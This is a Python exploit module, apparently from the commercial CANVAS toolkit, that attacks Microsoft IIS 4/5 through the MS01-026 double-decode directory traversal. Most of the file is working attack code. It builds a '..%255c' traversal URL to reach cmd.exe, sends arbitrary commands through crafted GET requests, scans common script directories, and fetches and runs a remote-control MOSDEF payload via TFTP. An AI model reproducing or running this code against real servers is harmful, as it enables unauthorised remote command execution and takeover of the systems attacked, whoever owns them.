#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information

import sys
#covers both angles
if "." not in sys.path: sys.path.append(".")

from exploitutils import *
from tcpexploit import tcpexploit

NAME="iis_doubledecode (MS01-026)"
DESCRIPTION="Poor input validation allows remote users to execute arbitrary commands"
DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Microsoft"
DOCUMENTATION["Notes"]=""" You'll need to run this as root
on Linux so it can bind to port 69 for our TFTP server (which we use to upload
MOSDEF)

This exploit needs to copy cmd.exe into a writable directory
in order to use the > or , characters, I believe. Even if you do this
you still can't call debug.exe. 

This was reported by NSFOCUS and resulted in Microsoft Advisory MS01-026
"""
DOCUMENTATION["Repeatability"]="Infinite"
DOCUMENTATION["CVE Name"] = "CVE-2001-0333"
DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2001-0333"
DOCUMENTATION['CVSS'] = 7.5
DOCUMENTATION["MSRC"] = "http://www.microsoft.com/technet/security/Bulletin/MS01-026.mspx"
DOCUMENTATION["Notes"] = """
The IIS Double Decode module will automatically use tftp to get a MOSDEF node on the remote target. 
This will not work through a bounced win32 node (due to threading).

"""
VERSION="1.0"

PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Windows"] ]
PROPERTY['VERSION'] = [ "NT", "2000" ]
PROPERTY["MSADV"]="MS01-026"
NOTES="""
"""

CHANGELOG="""

"""

import canvasengine
from libs.canvasos import canvasos
from ExploitTypes.CommandLineExecuter import CommandExploit
import urllib
from libs.spkproxy import urlopen
 
class theexploit(tcpexploit, CommandExploit):
    def __init__(self):
        tcpexploit.__init__(self)
        CommandExploit.__init__(self)
        
        self.port=80
        self.host=""
        #characters IIS hates us to use
        self.badstring=",><"
        self.setVersions()
        self.version=1
        self.done=0
        self.name=NAME    
        self.basepath="/scripts/"
        self.command=None #none by default. We want to try to automatically load MOSDEF
        self.docmdcpy=True 
        self.target_os=None 
        self.ssl=0
        self.command="dir"
        return

    def getargs(self):
        """
        Get arguments for attack
        """
        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))
        self.getarg("basepath")
        self.getarg("command")
        self.getarg("ssl")
        return 
    
    def displayVersions(self):
        for v in self.versions.keys():
            print "Version %d: %s"%(v,self.versions[v][0])

    def setVersions(self):
        self.versions={}
        self.versions[1]=[""]

    def neededListenerTypes(self):
        #only win32 mosdef is ever valid
        return [canvasengine.WIN32MOSDEF]
        
    def set_prefix(self):
        self.prefix=self.basepath
        self.prefix+="..%255c..%255c..%255c..%255c"
        self.prefix+=self.cmddir+self.cmdexename+"?%20/c%20"        
        return
    
    def test(self):

        """
        Quicky banner check - looks for comon basepaths
        """
        self.getargs()
        self.log("Using basepath=%s"%self.basepath)
        #automatically check out some common basepaths, starting with the one specified
        if not self.ssl:
            #currently we only check the banner if we are not ssl
            ret=self.bannerchecktest({"IIS/5.0":1}, sendstr="HEAD / HTTP/1.0\r\n\r\n")
            print "after bannerchecktest"
            print ret
            if not ret:
                self.log("Failed to find IIS")
                return 0
        
        for basepath in [self.basepath,"/scripts/","/msadc/","/_vti_bin/","/iisadmpwd/"]:
            self.log("Testing for basepath: %s"%basepath)
            self.argsDict["basepath"]=basepath
            self.basepath=basepath
            self.outputdir="winnt/system32/"
            self.set_prefix()

            #command="dir"
            command=self.command
            data=self.run_command(command)
              
            #we don't get the header here (we use spkproxy.urlopen)
            if type(data)==type("") and "<DIR>" in data:
                #we don't look for "directory" or other
                #english strings because that would
                #be localization dependant
                self.log("Found executable directory with prefix %s"%self.prefix)
                newos=canvasos()
                newos.base="Windows"
                newos.version="2000"
                newos.arch="x86"
                self.target_os=newos
                #we specifically CANT do debug.exe method
                #in IIS
                #self.capabilities+=["debug.exe"]
                self.capabilities+=["tftp"]
                self.version=1
                return ret
        self.version=0 #we failed
        return 0
        
    def run(self):
        self.getargs()
        
        self.setInfo("%s attacking %s:%d (in progress)"%(NAME,self.host,self.port))

        if self.version==0:
            #In order to correctly set up our attack string we first need to 
            #determine the OS we are targeting as much as possible
            ret=self.test()
            if not ret:
                self.log("Testing didn't find target as vulnerable")
                return 0
	
        if not self.target_os:
            self.log("Don't know the target operating system - bailing!")
            return 0
        #next we upload a MOSDEF executable and execute it
        self.upload_and_execute()

        ret=0
        if self.ISucceeded():
            self.log("Got a new MOSDEF up and running!")
            ret=1
        
        return ret
    
    def run_command(self, command, blind=0):
        """
        Runs the blind command, returns True if we think we are successful
        False otherwise
        """
        self.log("Attacking %s:%d"%(self.host,self.port))
        
        sploitstring=self.makesploit(command)
        self.log("sploitstring %s"%sploitstring)
        ret=0
        try:
            if self.ssl:
               ssl="s"
            else:
               ssl=""
            url="http%s://%s:%d/%s%s"%(ssl,self.host,self.port,self.prefix,urllib.quote_plus(command))
            self.log("URL=%s"%url)
            fd=urlopen(url)
            data=fd.read()
            
            #s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            #s=self.gettcpsock()
            #s.connect((self.host, self.port))
            #self.websend(s,sploitstring)
            #self.log("Sent attack")
            if blind:
                return 1
            #data=self.webrecv(s)
            self.log("Got data: %s"%data)
            if data.count("403 Access Forbidden"):
                return ""
            if data:
                return data
        except:
            return False 
        return False
        
    def makesploit(self,command):
        """
        Construct the attack
        """

        sploitstring=""
        self.log("Command: %s"%command)
        command=urllib.quote_plus(command)
        self.set_prefix()
        sploitstring="GET "+self.prefix+"%s HTTP/1.0\r\nHost: localhost\r\nUser-Agent: bob\r\n\r\n"%(command)  
        self.log("Sending: %s"%sploitstring)
        return sploitstring


if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
    
